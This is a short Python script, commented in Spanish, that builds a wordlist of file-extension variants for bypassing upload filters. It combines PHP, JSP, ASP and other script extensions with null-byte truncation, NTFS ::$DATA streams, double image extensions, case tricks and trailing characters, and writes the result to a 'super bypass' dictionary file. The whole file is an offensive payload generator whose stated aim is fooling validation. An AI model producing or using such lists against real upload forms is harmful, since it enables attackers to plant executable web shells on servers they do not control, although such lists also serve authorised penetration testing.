from itertools import product

# Lenguajes y extensiones
extensiones_web = {
    "php": ["php", "php3", "php4", "php5", "php7", "php8", "pht", "phar", "phpt", "pgif", "phtml", "phtm"],
    "jsp": ["jsp", "jspx"],
    "asp": ["asp", "aspx", "cer", "asa", "asax"],
    "perl": ["pl", "cgi"],
    "python": ["py", "pyw"],
    "ruby": ["rb", "erb"]
}

img_exts = ["jpg", "jpeg", "png", "gif", "bmp", "webp", "svg"]

# Truncamientos posibles
truncs = ["%00", "\\x00"]

# NTFS alternate data streams
ntfs = ["::$DATA"]

# Sufijos para burlarse de validaciones
sufijos_extra = ["", ".", "..", " ", "   "]

# Slash tricks para rutas
slash_tricks = ["/", "/./", "..;/"]

diccionario = set()

# Mayúsculas y combinaciones alternas
def case_variants(ext):
    ext = ext.lower()
    return list(set([
        ext,
        ext.upper(),
        ext.capitalize(),
        "".join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(ext)]),
        "".join([c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(ext)])
    ]))

# Generar combinaciones
for lang, exts in extensiones_web.items():
    for ext in exts:
        for suf in sufijos_extra:
            diccionario.add(f".{ext}{suf}")
        
        for img in img_exts:
            diccionario.add(f".{img}.{ext}")
        
        for trunc, img in product(truncs, img_exts):
            diccionario.add(f".{ext}{trunc}.{img}")
        
        diccionario.add(f".{ext}::$DATA")
        
        for variant in case_variants(ext):
            diccionario.add(f".{variant}")
        
        for trick in slash_tricks:
            diccionario.add(f"{trick}{ext}")
        
        for img in img_exts:
            for suf in sufijos_extra:
                diccionario.add(f".{img}.{ext}{suf}")
        
        for img, data in product(img_exts, ntfs):
            diccionario.add(f".{img}.{ext}{data}")

with open("diccionario_super_bypass.txt", "w") as f:
    for entry in sorted(diccionario):
        f.write(entry + "\n")

print(f"[+] Diccionario generado con {len(diccionario)} entradas.")

